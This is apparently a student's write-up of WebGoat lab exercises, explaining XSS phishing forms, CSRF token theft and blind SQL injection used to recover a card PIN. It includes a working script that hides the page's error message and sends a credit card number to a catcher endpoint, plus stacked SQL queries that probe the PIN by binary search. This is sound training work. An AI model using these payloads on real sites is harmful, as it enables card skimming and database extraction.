#Benjamin Cheng, 1004838045, benjamin.cheng@mail.utoronto.ca

Part 1 Explanation:
The contents of the search query is rendered without escaping, allowing HTML
to be injected in the page. A form is injected with username, password, and a
login field. The form looks like a normal login form on the page, which would
be a good phishing vector. A script is also injected which adds an event
listener to the submit event of the form, which then sends a GET request to the
required URL with the contents of the form.

Part 2 Explanation:
The server does input validation for the three digit access code. If it is
invalid, it displays a message with the invalid content to notify the user.
However, this is not escaped so HTML/JS inside this would be rendered/run by
the browser.

The script removes the message and sets the three digit access code as the
default, so as to imitate the original screen. It adds an event listener to the
form which sends a GET request with the credit card number on submit. Thus the
page looks identical to the original page served by the same website.

<script>
	document.getElementById('message').remove();
	const form = document.form;
	form.addEventListener('submit', (event) => {
		fetch(`/WebGoat/catcher?PROPERTY=yes&stolen-credit-card=${form.input1.value}`);
	});
	form.input2.value = '000';
</script>

Part 3 Explanation:
The message field is rendered without proper escaping, so HTML can be injected
that will be rendered by users browsers when viewing the message.

Part 4 Explanation:
The CONFIRM button on the prompt simply creates another GET request with the
transfer parameter set to CONFIRMED. We add a script to the original code which
sends off this request after the browser has tried to load the original image.

Part 5 Explanation:
Since the attacking JS and the transfer page with the CSRF token live on the
same domain, a JS request to the main transfer screen can read the token from
the transfer page. A request is made to this page to retrieve the token, and
another request is sent with the transfer amount and token.

Part 8 Explanation:
The query I used was in the form of either:
1;SELECT * from credit WHERE cc_number = 1111222233334444 AND pin > X;
1;SELECT * from credit WHERE cc_number = 1111222233334444 AND pin = X;

If the first query returned "Account number is valid." we would know the pin is
> X and if it was invalid we would know that pin <= X.

I assumed the pin number was 4 digits, so I started with upper and lower bounds
of 10000 and 0. Then I performed binary search using the first query until I
found the pin was between 2362 and 2367, at which point I brute forced this
within this small range.
